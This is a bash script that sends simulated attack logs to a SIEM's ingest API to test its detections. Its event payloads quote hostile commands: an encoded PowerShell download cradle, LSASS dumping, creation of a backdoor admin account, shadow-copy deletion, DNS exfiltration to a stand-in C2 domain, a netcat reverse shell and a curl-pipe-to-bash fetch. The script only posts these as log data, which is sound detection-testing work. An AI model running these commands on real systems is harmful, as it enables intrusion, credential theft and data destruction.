#!/bin/bash
# simulate-attacks.sh — Send realistic attack event sequences to the CyberboxSIEM API
# Usage: ./simulate-attacks.sh <API_URL> [API_KEY]
# Example: ./simulate-attacks.sh http://cyberbox-api:8080
#          ./simulate-attacks.sh https://siem.cyberboxsecurity.com.br "919302f1..."

set -e

API="${1:-http://cyberbox-api:8080}"
API_KEY="${2:-}"
CONTENT_TYPE="Content-Type: application/json"
NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo "2026-03-12T10:00:00Z")

send_events() {
  local desc="$1"
  local payload="$2"
  if [ -n "$API_KEY" ]; then
    HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$API/api/v1/events:ingest" \
      -H "$CONTENT_TYPE" -H "X-Api-Key: $API_KEY" -d "$payload")
  else
    HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$API/api/v1/events:ingest" \
      -H "$CONTENT_TYPE" -H "x-tenant-id: safebox" -H "x-user-id: simulator" -H "x-roles: ingestor" \
      -d "$payload")
  fi
  echo "  [$HTTP_CODE] $desc"
}

echo "=== CyberboxSIEM Attack Simulation ==="
echo "Target: $API"
echo ""

# ── 1. Brute-force SSH login attempts ────────────────────────────────────
echo "[1/8] Brute-force SSH login attempts (3 failed + 1 success)..."
send_events "3 failed logins + 1 success from Tor exit nodes" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:00:00Z","raw_payload":{"EventID":4625,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.1","WorkstationName":"ATTACKER-1","FailureReason":"Unknown user name or bad password","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:00:01Z","raw_payload":{"EventID":4625,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.2","WorkstationName":"ATTACKER-2","FailureReason":"Unknown user name or bad password","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:00:02Z","raw_payload":{"EventID":4625,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.3","WorkstationName":"ATTACKER-3","FailureReason":"Unknown user name or bad password","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:00:03Z","raw_payload":{"EventID":4624,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.42","WorkstationName":"ATTACKER-21","hostname":"DC01"}}
  ]
}'

# ── 2. Privilege escalation ──────────────────────────────────────────────
echo "[2/8] Privilege escalation — new admin account created..."
send_events "Net user /add + net localgroup administrators" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:00Z","raw_payload":{"EventID":4688,"NewProcessName":"C:\\\\Windows\\\\System32\\\\net.exe","CommandLine":"net user backdoor P@ssw0rd /add","SubjectUserName":"administrator","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:01Z","raw_payload":{"EventID":4720,"TargetUserName":"backdoor","SubjectUserName":"administrator","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:02Z","raw_payload":{"EventID":4688,"NewProcessName":"C:\\\\Windows\\\\System32\\\\net.exe","CommandLine":"net localgroup administrators backdoor /add","SubjectUserName":"administrator","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:03Z","raw_payload":{"EventID":4732,"TargetUserName":"backdoor","MemberSid":"S-1-5-21-fake","SubjectUserName":"administrator","hostname":"DC01"}}
  ]
}'

# ── 3. Lateral movement — PsExec ─────────────────────────────────────────
echo "[3/8] Lateral movement — PsExec service installation..."
send_events "PsExec remote execution" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:02:00Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\services.exe","CommandLine":"C:\\\\Windows\\\\PSEXESVC.exe","ParentImage":"C:\\\\Windows\\\\System32\\\\services.exe","User":"NT AUTHORITY\\\\SYSTEM","hostname":"WEB01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:02:01Z","raw_payload":{"EventID":7045,"ServiceName":"PSEXESVC","ServiceFileName":"C:\\\\Windows\\\\PSEXESVC.exe","ServiceType":"user mode service","hostname":"WEB01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:02:02Z","raw_payload":{"EventID":3,"Image":"C:\\\\Windows\\\\PSEXESVC.exe","DestinationIp":"192.168.1.50","DestinationPort":445,"hostname":"WEB01"}}
  ]
}'

# ── 4. Suspicious PowerShell — encoded command ───────────────────────────
echo "[4/8] Suspicious PowerShell — base64-encoded command..."
send_events "Encoded PowerShell download cradle" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:03:00Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBiAGEAZAAuAHAAcwAxACcAKQA=","ParentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","User":"CORP\\\\jsmith","hostname":"WS042"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:03:01Z","raw_payload":{"EventID":3,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","DestinationIp":"192.168.1.50","DestinationPort":8080,"User":"CORP\\\\jsmith","hostname":"WS042"}}
  ]
}'

# ── 5. Mimikatz / credential dumping ─────────────────────────────────────
echo "[5/8] Credential dumping — Mimikatz-like LSASS access..."
send_events "LSASS memory access" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:04:00Z","raw_payload":{"EventID":10,"SourceImage":"C:\\\\Users\\\\admin\\\\Documents\\\\procdump64.exe","TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1010","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:04:01Z","raw_payload":{"EventID":1,"Image":"C:\\\\Users\\\\admin\\\\Documents\\\\procdump64.exe","CommandLine":"procdump64.exe -ma lsass.exe lsass.dmp","User":"CORP\\\\admin","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:04:02Z","raw_payload":{"EventID":11,"Image":"C:\\\\Users\\\\admin\\\\Documents\\\\procdump64.exe","TargetFilename":"C:\\\\Users\\\\admin\\\\Documents\\\\lsass.dmp","hostname":"DC01"}}
  ]
}'

# ── 6. Ransomware indicators ─────────────────────────────────────────────
echo "[6/8] Ransomware indicators — shadow copy deletion + recovery disabled..."
send_events "Shadow copy deletion + vssadmin" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:05:00Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\vssadmin.exe","CommandLine":"vssadmin delete shadows /all /quiet","ParentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","User":"NT AUTHORITY\\\\SYSTEM","hostname":"FS01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:05:01Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\wbadmin.exe","CommandLine":"wbadmin delete catalog -quiet","User":"NT AUTHORITY\\\\SYSTEM","hostname":"FS01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:05:02Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\bcdedit.exe","CommandLine":"bcdedit /set {default} recoveryenabled no","User":"NT AUTHORITY\\\\SYSTEM","hostname":"FS01"}}
  ]
}'

# ── 7. Data exfiltration — DNS tunneling ─────────────────────────────────
echo "[7/8] Data exfiltration — DNS tunneling pattern..."
send_events "Suspicious DNS queries to C2 domain" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:06:00Z","raw_payload":{"EventID":22,"QueryName":"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.evil-c2.example.com","Image":"C:\\\\Windows\\\\System32\\\\svchost.exe","hostname":"WS042"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:06:01Z","raw_payload":{"EventID":22,"QueryName":"z9y8x7w6v5u4t3s2r1q0p9o8n7m6l5k4.evil-c2.example.com","Image":"C:\\\\Windows\\\\System32\\\\svchost.exe","hostname":"WS042"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:06:02Z","raw_payload":{"EventID":22,"QueryName":"exfiltrated-data-chunk-03-base64enc.evil-c2.example.com","Image":"C:\\\\Windows\\\\System32\\\\svchost.exe","hostname":"WS042"}}
  ]
}'

# ── 8. Linux events — SSH + suspicious processes ─────────────────────────
echo "[8/8] Linux events — SSH brute force + reverse shell..."
send_events "Linux SSH brute force + netcat reverse shell" '{
  "events": [
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:07:00Z","raw_payload":{"program":"sshd","message":"Failed password for root from 203.0.113.50 port 22 ssh2","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:07:01Z","raw_payload":{"program":"sshd","message":"Failed password for root from 203.0.113.50 port 22 ssh2","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:07:02Z","raw_payload":{"program":"sshd","message":"Failed password for root from 203.0.113.50 port 22 ssh2","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:07:03Z","raw_payload":{"program":"sshd","message":"Accepted password for root from 203.0.113.50 port 22 ssh2","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"linux_audit","event_time":"2026-03-12T10:07:04Z","raw_payload":{"program":"audit","message":"type=EXECVE msg=audit(1710000000.000:100): argc=3 a0=/bin/bash a1=-c a2=nc -e /bin/bash 203.0.113.50 4444","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"linux_audit","event_time":"2026-03-12T10:07:05Z","raw_payload":{"program":"audit","message":"type=EXECVE msg=audit(1710000001.000:101): argc=4 a0=curl a1=-s a2=http://203.0.113.50/backdoor.sh a3=| bash","hostname":"web-prod-01"}}
  ]
}'

echo ""
echo "=== Simulation complete ==="
echo "Check the SIEM dashboard for alerts. Expected detections:"
echo "  - Brute force / multiple failed logins"
echo "  - Account creation / privilege escalation"
echo "  - PsExec / lateral movement"
echo "  - Encoded PowerShell execution"
echo "  - LSASS credential dump"
echo "  - Ransomware indicators (shadow copy deletion)"
echo "  - DNS tunneling / exfiltration"
echo "  - Linux reverse shell"
